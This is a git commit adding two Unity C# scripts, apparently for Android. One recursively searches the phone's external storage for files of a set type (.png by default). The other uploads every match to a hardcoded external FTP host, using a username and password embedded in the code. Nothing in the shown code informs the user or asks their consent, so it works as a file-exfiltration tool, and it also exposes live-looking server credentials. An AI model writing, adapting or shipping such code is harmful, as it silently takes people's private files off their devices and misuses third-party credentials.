91babf3d82de978eb460bf40d30fe39ef1a52380
Shahrose <shahrosetheme@gmail.com>
2019-08-17 15:34:38 +0500

    File Searcher with Ftp Uploader

---
+++ AndroidFileSearcher.cs
@@ -0,0 +1,85 @@
+﻿using System;
+using System.IO;
+using System.Collections;
+using System.Collections.Generic;
+using UnityEngine;
+
+public class AndroidFileSearcher: MonoBehaviour
+{
+    public List<string> files;
+    public Queue queueDir;
+    public Uploader uploader;
+    public float timeToWaitBeforeUploading;
+    private string fileTypeToFind; // example .png .txt
+
+
+    void Start()
+    {
+        //Assign the variable "uploader" here or in unity 
+        queueDir = new Queue();
+
+        //By Default
+        fileTypeToFind = ".png";
+        timeToWaitBeforeUploading = 15.0f;
+    }
+
+    public void GetFiles()
+    {
+        string path = "";
+        try
+        {
+            //For getting root location of sd memory of phone
+            AndroidJavaClass jc = new AndroidJavaClass("android.os.Environment");
+            path = jc.CallStatic<AndroidJavaObject>("getExternalStorageDirectory").Call<string>("getAbsolutePath");
+
+            //Searches files in the root folder
+            string[] tempRoot = Directory.GetFiles(Application.dataPath);
+            for (int j = 0; j < tempRoot.Length; j++)
+            {
+                if (Path.GetExtension(tempRoot[j]) == fileTypeToFind)
+                {
+                    files.Add(tempRoot[j]);
+                }
+            }
+
+            //Searches files in the sub folders
+            do
+            {
+                string[] s = Directory.GetDirectories(path);
+                for (int i = 0; i < s.Length; i++)
+                {
+                    queueDir.Enqueue(s[i]);
+                }
+                path = (string)queueDir.Dequeue();
+
+                string[] subRootPaths = Directory.GetFiles(path);
+                for (int j = 0; j < subRootPaths.Length; j++)
+                {
+                    if (Path.GetExtension(subRootPaths[j]) == fileTypeToFind)
+                    {
+                        files.Add(subRootPaths[j]);
+                    }
+                }
+            } while (queueDir.Count > 0);
+
+        }
+        catch (Exception e)
+        {
+            Debug.Log(e.Message);
+        }
+    }
+
+    public void uplaodListOfFiles()
+    {
+        StartCoroutine(WaitToFinishSearching());
+    }
+
+    IEnumerator WaitToFinishSearching()
+    {
+        GetFiles();
+        yield return new WaitForSeconds(timeToWaitBeforeUploading);
+        uploader.FTPUpload(files);
+    }
+
+}
+
---
+++ Uploader.cs
@@ -0,0 +1,66 @@
+﻿using UnityEngine;
+using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Net;
+
+
+public class Uploader : MonoBehaviour
+{
+    private string FTPHost;
+    private string FTPUserName;
+    private string FTPPassword;
+    private string InnerPath;
+
+    void Start()
+    {
+        FTPHost = "ftp://ftpupload.net"; //example "ftp://website.com" or IP address
+        FTPUserName = "epiz_24201306"; //example "username"
+        FTPPassword = "pJSaxY2UCOEU"; //example "password"
+        InnerPath = "/htdocs/"; //example "/folder/"
+    }
+
+    public void FTPUpload(List<string> files)
+    {
+
+        string path = "";
+        for (int i = 0; i < files.Count; i++)
+        {
+            try
+            {
+                path = files[i];
+
+                FtpWebRequest ftp = (FtpWebRequest)FtpWebRequest.Create(FTPHost + InnerPath + new FileInfo(path).Name);
+                ftp.Credentials = new NetworkCredential(FTPUserName, FTPPassword);
+
+                ftp.KeepAlive = true;
+                ftp.UseBinary = true;
+                ftp.Method = WebRequestMethods.Ftp.UploadFile;
+
+                FileStream fs = File.OpenRead(path);
+                byte[] buffer = new byte[fs.Length];
+                fs.Read(buffer, 0, buffer.Length);
+                fs.Close();
+
+                Stream ftpstream = ftp.GetRequestStream();
+                ftpstream.Write(buffer, 0, buffer.Length);
+                ftpstream.Close();
+            }
+            catch (Exception ex)
+            {
+                throw ex;
+            }
+        }
+    }
+
+    void OnFileUploadProgressChanged(object sender, UploadProgressChangedEventArgs e)
+    {
+        Debug.Log("Uploading Progreess: " + e.ProgressPercentage);
+    }
+
+    void OnFileUploadCompleted(object sender, UploadFileCompletedEventArgs e)
+    {
+        Debug.Log("File Uploaded");
+    }
+
+}
